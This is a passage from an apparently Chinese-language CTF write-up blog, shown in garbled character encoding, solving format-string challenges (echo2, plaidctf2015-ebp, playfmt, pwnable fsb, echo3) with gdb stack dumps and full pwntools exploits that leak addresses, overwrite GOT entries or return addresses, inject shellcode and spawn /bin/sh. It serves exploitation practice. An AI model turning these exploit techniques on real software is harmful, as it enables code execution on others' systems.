= __readfsqword(0x28u);  do  {    fgets(&amp;s, 256, stdin);    printf(&amp;s, 256LL);  }  while ( strcmp(&amp;s, &quot;exit\n&quot;) );  system(&quot;echo Goodbye&quot;);  exit(0);}</code></pre><p>ä»£ç æ˜¯æ¯”è¾ƒç®€å•çš„ï¼Œè¿˜æ˜¯got hijack å°±è¡Œäº†ã€‚éš¾ç‚¹ä¹Ÿæ˜¯å¦‚ä½•æ¥å¤„ç†è¿™ä¸ªpieä¿æŠ¤ã€‚</p><h3 id="gdb-è°ƒè¯•"><a href="#gdb-è°ƒè¯•" class="headerlink" title="gdb è°ƒè¯•"></a>gdb è°ƒè¯•</h3><pre><code class="c">=&gt; 0x555555554984 &lt;echo+68&gt;:    call   0x5555555547a0 &lt;printf@plt&gt;   0x555555554989 &lt;echo+73&gt;:    lea    rax,[rbp-0x110]   0x555555554990 &lt;echo+80&gt;:    lea    rsi,[rip+0xfd]        # 0x555555554a94   0x555555554997 &lt;echo+87&gt;:    mov    rdi,rax   0x55555555499a &lt;echo+90&gt;:    call   0x5555555547d0 &lt;strcmp@plt&gt;</code></pre><p>æ‰¾åˆ°å…³é”®ç‚¹ï¼Œç„¶åçœ‹ä¸€ä¸‹æ ˆæƒ…å†µï¼š</p><pre><code class="c">0192| 0x7fffffffe1c0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087--More--(25/48)0200| 0x7fffffffe1c8 --&gt; 0x7ffff7a88947 (&lt;_IO_default_setbuf+23&gt;:    cmp    eax,0xffffffff)0208| 0x7fffffffe1d0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad20870216| 0x7fffffffe1d8 --&gt; 0x7ffff7fd8700 (0x00007ffff7fd8700)0224| 0x7fffffffe1e0 --&gt; 0x555555554810 (&lt;_start&gt;:    xor    ebp,ebp)0232| 0x7fffffffe1e8 --&gt; 0x7ffff7a85439 (&lt;_IO_new_file_setbuf+9&gt;:    test   rax,rax)0240| 0x7fffffffe1f0 --&gt; 0x7ffff7dd2620 --&gt; 0xfbad2087</code></pre><p>å‘ç°åœ¨<code>0x7fffffffe1e0</code>è¿™é‡Œå°±å¯ä»¥æ³„æ¼å‡ºpieåŸºå€äº†ï¼Œç¡®å®šåç§»æ˜¯34ã€‚ç„¶åå‰©ä¸‹çš„å°±ç®€å•äº†ï¼Œç›´æ¥idaé‡Œé¢æŸ¥çœ‹ä¸‹pltå’Œgot ï¼ŒåŠ ä¸Šä»¥åå°±å¾—åˆ°äº†çœŸæ­£çš„<br>pltå’Œgotåœ°å€ã€‚</p><h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><pre><code class="c">from pwn import *context.log_level = &#39;debug&#39;context.arch = &#39;amd64&#39;io = process(&#39;./echo2&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,28200)def leak1():    io.sendline(&#39;%34$p&#39;)    io.recvuntil(&#39;0x&#39;)    p_bass_addr = int((io.recv(9)+&#39;000&#39;),16)    return p_bass_addrp_bass_addr = leak1()print(&#39;p_bass_addr -&gt;&#39; + hex(p_bass_addr))print_got = 0x201020 + p_bass_addrprint(&#39;print_got -&gt;&#39; + hex(print_got))system_plt = 0x790 + p_bass_addrprint(&#39;system_plt -&gt;&#39; + hex(system_plt))def fmt(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultprev = 0 payload = &quot;&quot;key = system_pltfor i in range(3):    payload +=fmt(prev,(key &gt;&gt; 16*i) &amp; 0xffff,14+i)     prev = (key &gt;&gt; i*16) &amp; 0xffffpayload = payload.ljust(0x40,&#39;a&#39;) + flat([print_got,print_got+2,print_got+4])# raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.sendline(&#39;/bin/sh\x00&#39;)io.interactive()</code></pre><p>-â€”  </p><p>** æ¥ä¸‹æ¥çš„é¢˜ï¼Œéƒ½æ˜¯bufä¸å†æ ˆçš„ä¸Šçš„é¢˜ç›®ã€‚**</p><h2 id="plaidctf2015-ebp"><a href="#plaidctf2015-ebp" class="headerlink" title="plaidctf2015-ebp"></a>plaidctf2015-ebp</h2><h3 id="ä¿æŠ¤å’Œarch-4"><a href="#ä¿æŠ¤å’Œarch-4" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code class="c">[*] &#39;/media/psf/mypwn2/buuctf/plaidctf2015_ebp/ebp&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>å¯ä»¥çœ‹åˆ°nxä¿æŠ¤æ˜¯å…³é—­çš„ï¼Œå¯ä»¥æƒ³åŠæ³•åˆ©ç”¨shellcodeã€‚</p><h3 id="idaåˆ†æ-5"><a href="#idaåˆ†æ-5" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int __cdecl main(int argc, const char **argv, const char **envp){  int result; // eax  while ( 1 )  {    result = (int)fgets(buf, 1024, stdin);    if ( !result )      break;    echo();  }  return result;}</code></pre><p>æ¼æ´å‡½æ•°ï¼š</p><pre><code class="c">int make_response(){  return snprintf(response, 0x400u, buf);}</code></pre><p>ä»£ç ååˆ†ç®€å•ï¼Œä½†æ˜¯è¿™æ¬¡çš„æ¼æ´å‡½æ•°å˜æˆäº†snprintf ï¼Œæ—¶åˆ»æ³¨æ„åç§»çš„è®¡ç®—æ˜¯é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»ã€‚ä¸”bufæ˜¯åœ¨bssæ®µä¸Šçš„ï¼Œå·²ç»å˜å¾—ä¸æ˜¯æˆ‘ä»¬å½“åˆä¸€æ ·ååˆ†çš„å¥½æ§åˆ¶ï¼Œæ­¤æ—¶å°±éœ€è¦æƒ³åŠæ³•å¥½å¥½åˆ©ç”¨æ ˆä¸ŠåŸæ¥æœ‰çš„æ•°æ®ã€‚</p><h3 id="gdbè°ƒè¯•-1"><a href="#gdbè°ƒè¯•-1" class="headerlink" title="gdbè°ƒè¯•"></a>gdbè°ƒè¯•</h3><pre><code class="html">gdb-peda$ stack 0x200000| 0xffffd320 --&gt; 0x804a480 --&gt; 0x00004| 0xffffd324 --&gt; 0x4000008| 0xffffd328 --&gt; 0x804a080 (&quot;AAAA\n&quot;)0012| 0xffffd32c --&gt; 0xf7fd31b0 --&gt; 0xf7e00000 --&gt; 0x464c457f0016| 0xffffd330 --&gt; 0xf7fe77eb (&lt;_dl_fixup+11&gt;:    add    esi,0x15815)0020| 0xffffd334 --&gt; 0x00024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x00028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>å¯ä»¥çœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µã€‚å¯ä»¥çœ‹åˆ°ä¸Šé¢æœ‰å¾ˆå¤šå¯ä»¥åˆ©ç”¨çš„åœ°å€ä¿¡æ¯ï¼Œå…¶ä¸­æœ€å¸¸ç”¨çš„ä¹Ÿæ˜¯ebpé“¾ ï¼š</p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p><strong>ä¹Ÿå°±æ˜¯è¿™ä¸€ä¸ªï¼Œç¬¬ä¸€æ¬¡å¯ä»¥é€šè¿‡åˆ©ç”¨0xffffd338ï¼ˆebp1ï¼‰è¿™ä¸ªåœ°å€ï¼Œå…¶æŒ‡å‘0xffffd358 ï¼ˆebp2ï¼‰ï¼Œç„¶ååˆ©ç”¨<code>%xc%4$hhn</code> å°±å¯ä»¥ä¿®æ”¹0xffffd378ï¼ˆebp3ï¼‰ã€‚</strong><br><strong>å°†0xffffd378 æ”¹ä¸ºæŒ‡å‘ret addressçš„æ ˆåœ°å€  <code>0xffffd33c</code>  ï¼š</strong></p><pre><code class="html">0024| 0xffffd338 --&gt; 0xffffd358 --&gt; 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)0028| 0xffffd33c --&gt; 0x804852c (&lt;echo+11&gt;:    mov    DWORD PTR [esp],0x804a480)</code></pre><p>æ”¹å®Œä¹Ÿå°±æ˜¯è¿™æ ·çš„æ•ˆæœã€‚<br><strong>è¿™æ ·å°±åˆå¯ä»¥é€šè¿‡åˆ©ç”¨ 0xffffd358 ï¼ˆebp2ï¼‰ï¼Œå…¶æŒ‡å‘ 0xffffd33cï¼ˆebp3ï¼‰ï¼Œ</strong><br><strong>æ¥ç€å°±ç®—ä¸€ä¸‹0xffffd358 ï¼ˆebp2ï¼‰çš„åç§» yï¼Œç„¶ååˆ©ç”¨<code>%xc%y$hhn</code> å°±å¯ä»¥ä¿®æ”¹0x804852cï¼ˆret addressï¼‰</strong></p><p>è¿™æ ·æ”»å‡»æ€è·¯ä¹Ÿå°±å‡ºæ¥äº†ï¼Œå¯ä»¥ä¿®æ”¹retaddress ï¼Œè¿”å›åœ¨å¯æ§çš„buf ä¸Šé¢æ”¾å¥½shellcode ï¼Œæ§åˆ¶ç¨‹åºè·³åˆ°shellcodeå³å¯ã€‚</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./ebp&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,29994)buf = 0x0804a080 + 0x40 #0x804a0c0raw_input(&#39;-&gt;&#39;)io.sendline(&#39;%4$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[-2:],16)key2 = 0xa0c0payload = &#39;%{}c%4$hhn&#39;.format(key1)raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()payload = &#39;%{}c%12$hn&#39;.format(key2)payload = payload.ljust(0x40) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre><h2 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h2><h3 id="ä¿æŠ¤å’Œarch-5"><a href="#ä¿æŠ¤å’Œarch-5" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>[*] &#39;/media/psf/mypwn2/buuctf/hitcontraining_playfmt/playfmt&#39;    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX disabled    PIE:      No PIE (0x8048000)    RWX:      Has RWX segments</code></pre><p>æ²¡æœ‰ä»»ä½•ä¿æŠ¤ã€‚</p><h3 id="idaåˆ†æ-6"><a href="#idaåˆ†æ-6" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c">int do_fmt(){  int result; // eax  while ( 1 )  {    read(0, buf, 0xC8u);    result = strncmp(buf, &quot;quit&quot;, 4u);    if ( !result )      break;    printf(buf);  }  return result;}</code></pre><p>ä¸Šå±‚æœ‰play å’Œ mainå‡½æ•°ï¼Œä¸€å…±ä¸‰å±‚ï¼Œåœ¨ç¬¬ä¸‰å±‚çš„è¿™ä¸ªå‡½æ•°å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œè®©æˆ‘ä»¬å¾ˆæ–¹ä¾¿çš„ç”¨ebpé“¾æ¥åšé¢˜ã€‚ç„¶åï¼Œæœ‰æ— é™æ¬¡çš„è§¦å‘è¿™ä¸ªæ¼æ´çš„æœºä¼šã€‚</p><p>æ”»å‡»æ€è·¯ ï¼šå› ä¸ºæ²¡æœ‰å¼€nxä¿æŠ¤ï¼Œä¹Ÿå°±ä»¥ä¸ºç€å¯ä»¥ç”¨shellcodeè¿›è¡Œæ”»å‡»ã€‚ç„¶åè¿˜æ˜¯æ”¹è¿”å›åœ°å€ï¼Œæå‰åœ¨å¯æ§çš„bufåˆé€‚çš„åœ°æ–¹æ‘†ä¸Šshellcodeï¼Œç„¶åè·³ä¸Šå»å³å¯ã€‚</p><h3 id="gdbåˆ†æ"><a href="#gdbåˆ†æ" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/84eq2e.png" srcset="/img/loading.gif" alt></p><p>å¦‚å›¾æ‰€ç¤ºï¼Œåˆ©ç”¨è¿™ä¸ªé“¾å³å¯ã€‚å…ˆæƒ³åŠæ³•æŠŠ<code>Oxffffd358</code>  æ”¹æˆ <code>Oxffffd33c</code> :</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/HEOU3i.png" srcset="/img/loading.gif" alt></p><p>ç„¶ååœ¨æƒ³åŠæ³•æŠŠ0x8048507 è¿™ä¸ªè¿”å›åœ°å€æ”¹æˆæˆ‘ä»¬æ‘†æ”¾çš„shellcodeçš„åœ°å€å³å¯ã€‚</p><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./playfmt&#39;)# io = remote(&#39;node3.buuoj.cn&#39;,26382)buf = 0x0804A060 + 0x40 #0x804a0a0offset1 = 6offset2 = 10info(&#39;---leak stack address---&#39;)io.recvuntil(&#39;\n=====================\n&#39;)io.sendline(&#39;%10$p&#39;)ret_stack_addr = int(io.recv(10),16) - 28print(&#39;leak ret_stack_addr:&#39;+hex(ret_stack_addr))info(&#39;---change the retaddr---&#39;)key = int(str(hex(ret_stack_addr))[-2:],16)payload = &quot;%{}c%6$hhn&quot;.format(key)raw_input(&#39;-&gt;&#39;)io.sendline(payload)sleep(0.1)io.recv()key2 = 0xa0a0payload = &quot;%{}c%10$hn&quot;.format(key2)payload = payload.ljust(0x40)payload += asm(shellcraft.sh())raw_input(&#39;-&gt;&#39;)io.sendline(payload)io.recv()sleep(0.1)io.sendline(&#39;quit&#39;)io.interactive()</code></pre><p>è®°å¾—å‘å‡ºå»ä¸€æ¬¡payloadï¼Œä¸€å®šéœ€è¦æ¥å—ä¸€æ¬¡ï¼Œå†å»å‘ç¬¬äºŒä¸ªpayloadï¼Œé˜²æ­¢æ²¡æœ‰å®Œæˆä¸€ä¸ªprintfï¼Œå°±è®©ç¨‹åºæ¥å—å‘é€çš„ä¸œè¥¿ï¼Œè¿™æ ·å®¹æ˜“å´©æºƒã€‚</p><h2 id="pwnable-fsb"><a href="#pwnable-fsb" class="headerlink" title="pwnable-fsb"></a>pwnable-fsb</h2><h3 id="archå’Œä¿æŠ¤"><a href="#archå’Œä¿æŠ¤" class="headerlink" title="archå’Œä¿æŠ¤"></a>archå’Œä¿æŠ¤</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><p>å¼€äº†nxäº†ã€‚</p><h3 id="idaåˆ†æ-7"><a href="#idaåˆ†æ-7" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><pre><code class="c"> for ( k = 0; k &lt;= 3; ++k )  {    printf(&quot;Give me some format strings(%d)\n&quot;, k + 1);    read(0, buf, 0x64u);    printf(buf);  }  puts(&quot;Wait a sec...&quot;);  sleep(3u);</code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œæ§åˆ¶äº†å¯ä»¥åˆ©ç”¨printfå‡½æ•°æ¼æ´çš„æ¬¡æ•°ï¼Œåªå¯ä»¥åˆ©ç”¨4æ¬¡ã€‚</p><pre><code class="c">  execve(path, &amp;path, 0);</code></pre><p>ä¸”è¿™ä¸€æ¡å¯ä»¥ç»™ä½ æ‹¿åˆ°shellã€‚</p><p>é‚£æ”»å‡»æ€è·¯å°±å¯ä»¥æ˜¯æ”¹æ‰putsï¼Œsleepçš„gotè¡¨ï¼Œåˆ°è¿™ä¸ªæ‹¿å–shellçš„ä½ç½®å°±è¡Œã€‚<br>å› ä¸ºè¿™é‡Œä¸‹é¢å°±è°ƒç”¨ä¸€æ¬¡sleepï¼Œå°±æ”¹å®ƒå¥½äº†ï¼ŒåŸºæœ¬ä¸ä¼šå‡ºé—®é¢˜ã€‚</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/b41nYE.png" srcset="/img/loading.gif" alt><br>æ³¨æ„ä¸€ä¸‹è¿™é‡Œçš„æ±‡ç¼–ä»£ç ï¼Œå…¶ä¹Ÿæ˜¯è®©æ ˆçš„espå¤„äºä¸å®šçš„çŠ¶æ€ã€‚</p><h3 id="gdbåˆ†æ-1"><a href="#gdbåˆ†æ-1" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>æ­¤æ—¶çš„EBP = 0xffffd228 </p><pre><code>0000| 0xffffd1e0 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0004| 0xffffd1e4 --&gt; 0x804a100 (&quot;AAAA\n&quot;)0008| 0xffffd1e8 --&gt; 0x64 (&#39;d&#39;)0012| 0xffffd1ec --&gt; 0xf7f5b2a2 (&quot;__vdso_clock_gettime&quot;)0016| 0xffffd1f0 --&gt; 0xf7fe1fc9 (&lt;do_lookup_x+9&gt;:    add    ebx,0x1b037)0020| 0xffffd1f4 --&gt; 0x00024| 0xffffd1f8 --&gt; 0xf7ffdad0 --&gt; 0xf7ffda74 --&gt; 0xf7fd3470 --&gt; 0xf7ffd918 --&gt; 0x00028| 0xffffd1fc --&gt; 0xffffd278 --&gt; 0xf7e0b018 --&gt; 0x3eab0032| 0xffffd200 --&gt; 0xffffd2c0 --&gt; 0x804a024 --&gt; 0xf7ed6290 (&lt;close&gt;:    cmp    DWORD PTR gs:0xc,0x0)0036| 0xffffd204 --&gt; 0x8048870 (&quot;/bin/sh&quot;)0040| 0xffffd208 --&gt; 0x00044| 0xffffd20c --&gt; 0x00048| 0xffffd210 --&gt; 0xffffd4a4 --&gt; 0x00052| 0xffffd214 --&gt; 0xffffdfce --&gt; 0x656d2f00 (&#39;&#39;)0056| 0xffffd218 --&gt; 0xffffd230 --&gt; 0x00060| 0xffffd21c --&gt; 0xffffd234 --&gt; 0x00064| 0xffffd220 --&gt; 0x00068| 0xffffd224 --&gt; 0x10072| 0xffffd228 --&gt; 0xffffd378 --&gt; 0x0</code></pre><p>å¯ä»¥çœ‹åˆ°ï¼Œå› ä¸ºè¿™ä¸ªé¢˜æ˜¯main -&gt; fsb ,ç”¨æˆ·ä»£ç åªæœ‰2å±‚å‡½æ•°çš„è°ƒç”¨ï¼Œçœ‹è¿™ä¸ªebp chainçš„æ—¶å€™å°±æœ‰ç‚¹ä¸æ–¹ä¾¿äº†ï¼Œæˆ‘ä»¬æ²¡æœ‰ä¸€ä¸ªå®Œæ•´çš„chainæ¥ä½¿ç”¨ã€‚è¿™ä¸ªæ—¶å€™ï¼Œå°±åªèƒ½æŠŠebp3 çš„å€¼ï¼Œè‡ªå·±å†™ä¸Šå»ï¼Œå†™ä¸Šsleepçš„gotç„¶åå†æ”¹æˆæ‹¿shellçš„åœ°å€å°±è¡Œäº†ã€‚<br><img src="http://qiqianyun.chumen77.xyz/uPic/Bb3DnD.png" srcset="/img/loading.gif" alt><br><strong>æ•´ä¸ªè¿‡ç¨‹è¿˜æ˜¯éœ€è¦æ³„æ¼ä¸€ä¸‹æ ˆåœ°å€espï¼Œå› ä¸ºå…¶æ ˆæ˜¯å˜åŒ–çš„ã€‚æ³„éœ²ä»¥åï¼Œä¹Ÿè·å–ä¸€ä¸‹ebp2çš„å€¼ï¼Œç„¶åï¼ˆebp2- esp ï¼‰/4 ä¹Ÿå°±ç¡®å®šåˆ°äº†ï¼Œmainçš„ebpå€¼ï¼ˆebp3ï¼‰å¯¹åº”æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„åç§»å€¼ã€‚</strong>ç„¶åå†æ¬¡åˆ©ç”¨printfå‡½æ•°æ ¹æ®è¿™ä¸ªåç§»æ¥è¿›è¡Œæ”¹å†™sleep gotä¸Šçš„å€¼ã€‚</p><h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timecontext.log_level = &#39;debug&#39;context.arch = &#39;i386&#39;io = process(&#39;./fsb&#39;)# s = ssh(#     host=&quot;pwnable.kr&quot;,#     port=2222,#     user=&quot;fsb&quot;,#     password=&quot;guest&quot;# )# io = s.run(&quot;/home/fsb/fsb&quot;)# io = shell.run(&quot;/home/fsb/fsb&quot;)sleep_got = 0x0804a008info(&#39;--------leak stack base:-------&#39;)io.recvuntil(&#39;strings(1)\n&#39;)io.sendline(&#39;%14$p&#39;)io.recvuntil(&#39;0x&#39;)stack_base = int(io.recv(8),16) - 80print(hex(stack_base))info(&#39;--------leak the point to main ebp:-------&#39;)io.recvuntil(&#39;strings(2)\n&#39;)io.sendline(&#39;%18$p&#39;)io.recvuntil(&#39;0x&#39;)point = int(io.recv(8),16)print(hex(point))info(&#39;--------write sleep_got to main_ebp :-------&#39;)io.recvuntil(&#39;strings(3)\n&#39;)key1 = 0x0804A008payload = &#39;%&#39; + str(key1) + &#39;c%18$n&#39;io.sendline(payload)info(&#39;--------write tag to sleep_got :-------&#39;)tag = 0x869Foffset = (point - stack_base) / 4payload = &quot;%{}c%&#39;str(offset)&#39;$hn &quot;.format(tag)io.recvuntil(&#39;strings(4)\n&#39;)io.sendline(payload)io.interactive()</code></pre><h2 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h2><h3 id="ä¿æŠ¤å’Œarch-6"><a href="#ä¿æŠ¤å’Œarch-6" class="headerlink" title="ä¿æŠ¤å’Œarch"></a>ä¿æŠ¤å’Œarch</h3><pre><code>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x8048000)</code></pre><h3 id="idaåˆ†æ-8"><a href="#idaåˆ†æ-8" class="headerlink" title="idaåˆ†æ"></a>idaåˆ†æ</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt><br>è¿™ä¸€å¤„ä¼šè®©æ ˆçš„æƒ…å†µå˜å¾—æ— æ³•é¢„æµ‹ã€‚ç„¶åè¿›å…¥hardfmtï¼š</p><pre><code class="c">  for ( i = 0; i &lt;= 4; ++i )  {    read(0, buff, 0x1000u);    printf(buff);  }</code></pre><p>è¿™ä¸€å¤„å­˜åœ¨æ¼æ´ï¼Œä¸”å¾€ä¸‹çœ‹æ„Ÿè§‰æ²¡ä»€ä¹ˆå¥½åˆ©ç”¨çš„ï¼Œæ²¡ä»€ä¹ˆæ¼æ´å‡½æ•°ã€‚é‚£æ”»å‡»æ€è·¯å°±æ˜¯ï¼šæ”¹printfçš„gotè¡¨ï¼Œç„¶ååœ¨ç¬¬5æ¬¡ä¼ è¿‡å»<code>/bin/sh</code>å³å¯ã€‚<br>ï¼ˆè¿™ä¸ªé¢˜ç›®æ€è·¯è¿˜æ˜¯å¾ˆç®€å•çš„ï¼Œä½†æ˜¯å› ä¸ºè¿™ä¸ªæ¬¡æ•°çš„é™åˆ¶ï¼Œåœ¨å®é™…æ“ä½œè¿‡ç¨‹ä¸­ï¼Œè¦å……åˆ†çš„åˆ©ç”¨æ¯ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚ï¼‰</p><h3 id="gdbåˆ†æ-2"><a href="#gdbåˆ†æ-2" class="headerlink" title="gdbåˆ†æ"></a>gdbåˆ†æ</h3><p>å› ä¸ºæ ˆæƒ…å†µä¸ä¸€æ ·ï¼Œå¯ä»¥é€‰æ‹©æœ€é€‚åˆæˆ‘ä»¬åˆ©ç”¨æ¼æ´çš„æ ˆç©ºé—´ï¼Œè¿™æ ·åšèµ·æ¥ä¼šç®€å•ä¸€äº›ã€‚</p><p>æˆ‘è‡ªå·±é€‰æ‹©åœ¨åç§»åœ¨43çš„æ—¶å€™å¼€å§‹è¿›è¡Œåˆ†æï¼Œæƒ³åŠæ³•æ¥åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼š<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt></p><p>ä»”ç»†çœ‹ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µ ï¼Œç„¶åå†æ¬¡åˆ†æä¸‹æˆ‘ä»¬çš„ç›®æ ‡ ï¼š</p><ul><li>æ³„æ¼libcåŸºå€ï¼Œè®¡ç®—å‡ºsystemçš„å†…å­˜åœ°å€ã€‚</li><li>åœ¨æ ˆä¸Šæ„é€ å‡ºprintfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€ï¼ˆ0x0804a014å’Œ0x0804a016ï¼‰</li><li>åœ¨æ„é€ çš„gotåœ°å€ä¸Šï¼Œå¼€å§‹å†™systemåœ°å€</li></ul><p>ç”±äºè¿™ä¸ªæ¼æ´å¯ä»¥çš„ç”¨çš„æ¬¡æ•°æœ€å¤šæ˜¯4æ¬¡ï¼Œæ‰€ä»¥è¦å°½å¯èƒ½åˆ©ç”¨æ¯ä¸€æ¬¡ã€‚<br>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå¾ˆç®€å•å°±å¯ä»¥æ³„æ¼å‡ºlibcåŸºå€ã€‚<br>ä½†æ˜¯æ¥ä¸‹æ¥æ€ä¹ˆæ„é€ printfçš„gotåœ°å€å’Œprintfçš„gotåœ°å€+2çš„åœ°å€å°±æœ‰ç‚¹éš¾äº†ã€‚</p><p>æ­¤æ—¶æ³¨æ„å›¾ä¸Šå‰ä¸¤ä¸ªæ¡†æ¡†ï¼Œå¯ä»¥å‘ç°æŠŠç¬¬äºŒä¸ªæ¡†æ¡†çš„ä¸¤ä¸ªåœ°å€ä¿®æ”¹ä¸º ç¬¬ä¸€ä¸ªæ¡†æ¡†çš„æ ˆæŒ‡é’ˆï¼š</p><pre><code>gdb-peda$ set *0xffbe5e6c = 0xffbe5d54gdb-peda$ set *0xffbe5e64 = 0xffbe5d60</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt><br>è¿™ä¸ªè¿‡ç¨‹åœ¨æ³„æ¼ç›®æ ‡æ ˆåœ°å€ä»¥åï¼Œä¹Ÿæ˜¯å¯ä»¥é€šè¿‡ä¸€æ¬¡printfå‡½æ•°å†™å…¥2æ¬¡åœ°å€ï¼Œå®ç°è¿™ä¸ªæ ˆæƒ…å†µçš„ã€‚</p><p>æ¥ç€å°±å¯ä»¥æ„é€ gotåœ°å€ï¼š</p><pre><code>gdb-peda$ set *0xffbe5d60  = 0x0804a016gdb-peda$ set *0xffbe5d54  = 0x0804a014</code></pre><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>ç„¶åå°±å¯ä»¥å†™systemçš„å†…å­˜åœ°å€ä¸Šgotäº†ï¼š</p><pre><code>0120| 0xffbe5d88 --&gt; 0xffbe5e6c --&gt; 0xffbe5d54 --&gt; 0x804a014 --&gt; 0xf7e0cda0 (&lt;__libc_system&gt;:    sub    esp,0xc)</code></pre><p>è¿™æ ·å†ä¼ è¿‡å»ä¸€ä¸‹<code>/bin/sh</code>å³å¯ã€‚</p><h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *context.log_level = &#39;debug&#39;context.arch =&#39;i386&#39;import timeelf = ELF(&#39;./echo3&#39;)debug = 1while True:    if debug :        io = process(&#39;./echo3&#39;)        libc = elf.libc    else:        io = remote(&#39;node3.buuoj.cn&#39;,25057)        libc = ELF(&#39;./libc-2.23.so.i386&#39;)    payload = &#39;%43$pA%30$pA%47$p&#39;    io.sendline(payload)    address = io.recvline().strip()    if address[-3:] == &#39;637&#39;:        if address[7:10] == &#39;637&#39;:            libc_base = int(address[2:10],16) - 247 - libc.symbols[&#39;__libc_start_main&#39;]            tag1_stack_point = int(address[13:21],16) - 0x118            tag2_stack_point = int(address[13:21],16) - 0x104 - 0x8            system_addr = libc_base + libc.symbols[&#39;system&#39;]            print(&#39;system_addr  -&gt;&#39; + hex(system_addr))            print(&#39;tag1_stack_point -&gt;&#39; + hex(tag1_stack_point))            print(&#39;tag2_stack_point -&gt;&#39; + hex(tag2_stack_point))            break    else :        io.close()        continue# io = def fmtshort(prev,val,idx,byte = 2):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hn&quot;    return resultdef fmtbyte(prev,val,idx,byte = 1):    result = &quot;&quot;    if prev &lt; val :        result += &quot;%&quot; + str(val - prev) + &quot;c&quot;    elif prev == val :        result += &#39;&#39;    else :        result += &quot;%&quot; + str(256**byte - prev + val) + &quot;c&quot;    result += &quot;%&quot; + str(idx) + &quot;$hhn&quot;    return resultprintf_got = 0x0804a014key1 = int(hex(tag1_stack_point)[-4:],16)key2 = int(hex(tag2_stack_point)[-4:],16)info(&#39;--------change the two points to tag_stack_point:-------&#39;)# raw_input(&#39;-&gt;&#39;)prev = 0payload = &quot;&quot;for i in range(1):    payload 